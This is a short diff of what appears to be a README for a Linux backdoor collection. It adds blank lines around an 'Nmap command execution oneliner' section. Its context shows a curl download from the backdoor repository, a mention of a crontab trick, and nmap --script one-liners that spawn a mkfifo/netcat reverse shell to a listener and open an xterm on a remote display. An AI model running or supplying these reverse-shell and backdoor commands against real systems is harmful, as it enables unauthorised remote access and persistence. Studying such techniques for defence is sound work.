@@ -18,7 +18,10 @@ curl -O 'https://raw.githubusercontent.com/ulissescastro/linux-native-backdoors/
 
 You can use whatever payload you want to exploit, using crontab trick to demo one of many ways how can be harmful.
 
+
 **Nmap command execution oneliner**
+
 nmap --script <(echo "os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 8080 >/tmp/f')")
+
 nmap --script <(echo "os.execute('xterm -display 127.0.0.1:1')")
 
